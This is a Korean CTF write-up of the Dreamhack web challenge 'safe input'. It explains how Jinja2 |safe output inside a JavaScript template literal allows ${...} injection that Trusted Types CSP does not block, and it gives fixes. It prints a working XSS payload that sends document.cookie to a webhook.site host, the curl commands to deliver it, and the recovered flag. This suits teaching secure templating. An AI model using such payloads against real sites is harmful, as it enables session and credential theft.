---
layout: post
title:  "Dreamhack 워게임 safe input 풀이 — JS 템플릿 리터럴 안의 ${} 인젝션과 Trusted Types CSP 의 한계"
date:   2026-05-19 23:30:00 +0900
categories: security web wargame dreamhack writeup xss csp trusted-types template-literal
---

## 들어가며

Dreamhack 웹해킹 워게임 **safe input** (난이도 별 1, 풀이자 399명) 풀이입니다. "그렇게 안전해서 보이지도 않는다 (It's so safe that it can't be seen)" 라는 설명 그대로, 출제자가 Trusted Types CSP 와 `|safe` Jinja 필터를 동시에 걸어둔 미끼 가득한 문제. 핵심은 **"`{{x|safe}}` 가 JS 백틱 문자열 안에 들어갔을 때, `${...}` 인터폴레이션으로 임의 JS 가 실행되는 패턴"** — 그리고 **Trusted Types 가 이 케이스를 막지 못한다**.

문제 설명:

> It's so safe that it can't be seen.

스포일러 결론:

```bash
SERVER="http://host8.dreamhack.games:PORT"
WEBHOOK="https://webhook.site/<token>/leak"

# 페이로드: 백틱 안에서 ${...} 로 JS 실행 → 봇의 쿠키를 webhook 으로 송신
PAY='${fetch("'"$WEBHOOK"'?c="+encodeURIComponent(document.cookie))}'

# /report 에 보내면 headless Chrome (셀레니움) 이 봇으로 방문 → 우리 페이로드 실행
curl -X POST "$SERVER/report" --data-urlencode "text=$PAY"

# webhook 에 도착한 쿼리:
# ?c=flag%3DDH%7B3315a6d...%7D
```

## 1. 자료 파악

ZIP 안 구조:

```
deploy/app/
├── app.py
├── run.sh                  (export FLAG=...; python3 app.py)
├── requirements.txt        (flask, selenium)
└── templates/
    ├── test.html           ← XSS sink 가 여기
    └── report.html
```

`app.py` 의 핵심 두 라우트:

```python
@app.route("/test", methods=["GET"])
def intro():
    text = request.args.get("text")
    return render_template("test.html", test=text)

@app.route("/report", methods=["GET", "POST"])
def report():
    if request.method == "POST":
        text = request.form.get("text")
        if access_page(text, cookie={"name": "flag", "value": FLAG}):
            ...
```

`access_page` 는 셀레니움 headless Chrome 로:

1. `http://127.0.0.1:8000/` 방문 → 같은 origin 에서 cookie 등록 가능하게 함
2. `driver.add_cookie({"name": "flag", "value": FLAG})` → 봇의 쿠키에 flag 박힘
3. `http://127.0.0.1:8000/test?text=<우리 입력>` 방문

→ **우리 입력이 봇 컨텍스트의 `/test` 페이지에서 실행되면, `document.cookie` 에 FLAG 가 있다**. 전형적인 reflected XSS + report 봇 패턴.

### 1.1 sink 코드 — `templates/test.html`

```html
<meta http-equiv="Content-Security-Policy"
      content="require-trusted-types-for 'script'; trusted-types 16007a93f75cde3710032976adfbcbab;">
...
<script>
    const contentElement = document.getElementById('content');
    const safeInput = "Test: " + `{{test|safe}}`;
</script>
```

여기서 동시에 일어나는 두 가지가 핵심:

1. **`{{test|safe}}`** — Jinja2 의 `|safe` 필터는 HTML escape 를 비활성화. 우리가 보낸 text 가 **그대로** JS 소스에 박힘.
2. **백틱 문자열 안에 박힘** — `` `{{test|safe}}` `` 는 JS 의 template literal. **template literal 안에서는 `${expression}` 이 JS 식으로 평가** 됩니다.

## 2. 1차 가설 — 백틱 안 `${...}` 으로 임의 JS

XSS payload 구조를 떠올려 봅시다:

```javascript
// 우리가 보낸 text 가 그대로 박혀서 ↓ 처럼 됨
const safeInput = "Test: " + `${alert(1)}`;
//                            ^^^^^^^^^^^ ← 평가됨
```

`${alert(1)}` 는 백틱 안에서 자바스크립트 식으로 평가되고, 결과(undefined) 가 문자열로 변환되어 백틱 내용물로 들어갑니다. 식이 평가될 때 부작용(alert) 이 실행됨. **이 시점에서 이미 임의 코드 실행 = XSS 완성**.

곧바로 시험:

```bash
curl -G "$SERVER/test" --data-urlencode 'text=${alert(1)}'
```

응답 HTML 에서:

```html
const safeInput = "Test: " + `${alert(1)}`;
```

원하는 모양 그대로. ✅

## 3. CSP 분석 — Trusted Types 가 이 케이스를 못 막는 이유

응답에 들어 있는 CSP 한 줄:

```
require-trusted-types-for 'script'; trusted-types 16007a93f75cde3710032976adfbcbab;
```

이게 뭐냐:

- **`require-trusted-types-for 'script'`**: `script.src`, `eval`, `innerHTML`, `Function` 등 **"DOM 기반 script 주입 싱크"** 에 대해 raw 문자열을 넘기지 못하게 하고, 반드시 `TrustedScript` / `TrustedScriptURL` 객체를 통과시키도록 강제.
- **`trusted-types <policy-name>`**: 허용된 정책 이름. 여기서는 임의의 16진 토큰 하나만 허용.

직관: "DOM 으로 새 스크립트를 주입하려면 미리 등록된 정책 이름으로 만든 객체만 허용한다". 그래서 **DOM-based XSS 의 큰 줄기는 막힙니다**:

- `el.innerHTML = userInput;` → TT 에러
- `document.write(userInput);` → TT 에러
- `script.src = userInput;` → TT 에러

**하지만 이 케이스는 DOM-based XSS 가 아닙니다**. 우리는 **서버가 렌더링한 HTML 안의 `<script>` 태그 안쪽에 직접 코드를 박은** 것 — 즉 처음부터 정상적으로 파싱·실행되는 inline 스크립트. Trusted Types 의 검사 대상이 아닌, **이미 신뢰받은 스크립트 자체** 입니다.

> 비유: Trusted Types 는 "이 가게 안에서 새 상품을 만들려면 인증서 있는 직원만 가능" 이라는 규칙. 그런데 우리는 처음부터 매대에 진열되어 있는 상품(=인라인 스크립트)의 라벨을 직접 바꿔치기한 것. 누가 만든 게 아니라 처음부터 그렇게 있던 거라 인증서가 필요 없음.

CSP 에 **`script-src`, `connect-src` 같은 directive 가 하나도 없다** 는 점도 중요합니다:

- `script-src` 가 없으면 fallback 으로 `default-src` 가 적용되는데 그것도 없음 → **인라인 스크립트, 모든 출처 스크립트, 모든 fetch 가 허용**.
- 그래서 `fetch("https://webhook.site/...")` 로의 송신을 막을 게 없음.

## 4. 익스플로잇 — 봇의 쿠키 회수

페이로드 한 줄:

```javascript
${fetch("https://webhook.site/<token>/leak?c=" + encodeURIComponent(document.cookie))}
```

`/report` POST 로 보내면 셀레니움 봇이 `cookie=flag=<FLAG>` 를 세팅하고 `/test?text=...` 를 방문 → 우리 페이로드가 실행되어 webhook 에 GET 도착.

```bash
SERVER="http://host8.dreamhack.games:PORT"
PAY='${fetch("https://webhook.site/<token>/leak?c="+encodeURIComponent(document.cookie))}'

curl -X POST "$SERVER/report" --data-urlencode "text=$PAY"
```

3~5초 안에 webhook 콘솔에:

```
GET .../leak?c=flag%3DDH%7B3315a6d57505990bd277a89e82b2aa062fe346279ed019ca8096df3f5ecdaba2%7D
```

URL 디코드:

```
flag=DH{3315a6d57505990bd277a89e82b2aa062fe346279ed019ca8096df3f5ecdaba2}
```

플래그 회수 완료. ✅

## 5. 안전하게 고치기

### 5.1 `|safe` 를 빼는 게 1순위

가장 큰 문제는 `|safe` 가 켜져 있다는 것. Jinja2 가 자동 escape 를 해도, JS 문자열 컨텍스트 안에서는 HTML escape 가 충분하지 않을 수 있지만, 적어도 `<` / `&` / 따옴표는 escape 됩니다. **`|safe` 를 빼고 JSON 직렬화** 로 안전하게 박는 게 정공법:

```html
<script>
    const test = {{ test|tojson }};
    const safeInput = "Test: " + test;
</script>
```

`|tojson` 은 Jinja2 가 적절히 JS 안에서 안전한 문자열 리터럴(또는 JSON) 로 만들어줍니다. `<`, `"`, 백슬래시, line separator (U+2028) 같은 위험 문자도 자동 처리.

### 5.2 백틱 컨텍스트 자체를 피한다

JS 문자열 리터럴에는 `${...}` 라는 함정이 있는 backtick 대신 일반 큰따옴표 문자열을 쓰는 게 안전합니다:

```html
const safeInput = "Test: " + {{ test|tojson }};
// 또는
const safeInput = "Test: " + "{{ test|e('js') }}";
```

`|e('js')` 는 Jinja2 의 JS-aware escape 필터.

### 5.3 CSP 도 함께 강화

Trusted Types 만으로는 이번 케이스를 못 막지만, 같이 쓰면 다른 케이스(예: 의도치 않은 innerHTML) 를 방어해 줍니다. 하지만 같이 쓸 가치가 있으려면:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  connect-src 'self';
  require-trusted-types-for 'script';
  trusted-types <policy>;
```

`script-src 'self'` 가 있으면 webhook.site 로의 fetch 가 막혀서 OOB 유출이 어렵고, `connect-src 'self'` 로도 같은 효과. **CSP 는 하나의 directive 가 아니라 여러 layer 를 함께 쳐야** 의미가 있습니다.

## 6. 한 번 더 정리

### 6.1 취약점 카탈로그

| 단계 | 카테고리 | 원인 |
|---|---|---|
| `{{test|safe}}` 백틱 안 박힘 | XSS via Template Literal Interpolation | escape 비활성화 + `${...}` 식 평가 |
| `connect-src` 없음 | Missing CSP | 외부 송신 차단 안 됨 |
| 봇이 쿠키와 함께 페이지 방문 | Reflected XSS to credential leak | 봇-주입 시나리오의 표준 |

### 6.2 입문자가 챙겨가면 좋은 시각

- **컨텍스트별 escape 가 필요**. HTML 컨텍스트, JS 문자열, JS 식, URL, CSS 가 모두 다른 escape 규칙. `|safe` 라는 단어 하나가 보이면 일단 의심.
- **Trusted Types 는 만능이 아니다**. DOM-based XSS 의 큰 부분을 막지만, "서버가 만들어준 인라인 스크립트의 본문이 이미 오염" 된 경우는 도와주지 못함.
- **Template literal 의 `${}` 는 종종 잊혀지는 인젝션 표면**. 백틱이 보이면 자동으로 "여기 식 인터폴레이션 가능?" 을 물어보는 습관을 들이자.
- CSP 는 **여러 directive 의 조합** 일 때만 진짜 방어가 됨. 한두 줄짜리 CSP 는 거의 항상 우회 경로가 있음.

## 7. 시도했지만 실패한 것들 (회고)

이번 회차는 한 번에 풀렸지만, "이 CSP 가 정말 백틱 인젝션을 막지 않나?" 를 확인하려 잠깐 의심하느라 시간이 들었음.

### 7.1 의심 — CSP 가 정말 무력한가?

`require-trusted-types-for 'script'` 가 보일 때 처음엔 "그러면 우리가 만든 JS 식이 실행 자체를 못 하는 거 아닌가?" 라고 떠올렸음. 곧장 MDN 의 Trusted Types 페이지를 머릿속에서 다시 펼쳐서, **TT 가 보호하는 sink 의 정확한 목록** — innerHTML, outerHTML, document.write, eval, Function, script.src, script.text, setTimeout/setInterval(string) — 을 확인. 우리는 **이미 파싱되어 실행되는 인라인 스크립트의 expression** 을 만들 뿐, sink 호출이 아니다 → TT 무관. **30초 안에 의심 해소**하고 페이로드로 직진.

**회고**: CSP 가 어렵게 보이는 directive 가 있을 땐, 그 directive 의 "보호 범위" 를 정확히 떠올리는 습관이 중요. directive 이름이 무서워도 실제 보호 범위는 좁은 경우가 많고, 우리가 노리는 경로가 그 범위 밖이면 거의 영향 없음.

### 7.2 페이로드 모양 — `${}` 외에 다른 후보

처음엔 `\`</script><img src=x onerror=...>` 같은 백틱 escape + script tag close 도 떠올림. 하지만:

- 응답 HTML 의 `safeInput` 라인 컨텍스트는 `<script>` 태그 안, JS 문자열 안 — `</script>` 같은 시퀀스를 escape 안 한 채로 박는 게 가능한가? Jinja2 의 `|safe` 가 escape 를 끄긴 했지만 HTML 파서는 `</script>` 를 만나면 스크립트 블록을 종료시키므로 그 트릭이 통할 가능성도 있음.
- 하지만 **더 짧고 깔끔한 `${...}` 로 충분**하니 이 경로는 사용하지 않음.

**회고**: 정공법이 보일 때 트릭에 매달리지 말 것. 변형/확장은 1차 풀이 후에.

---

`|safe` 와 backtick 의 조합은 거의 항상 XSS 입니다. 둘 중 하나는 꼭 없애세요.
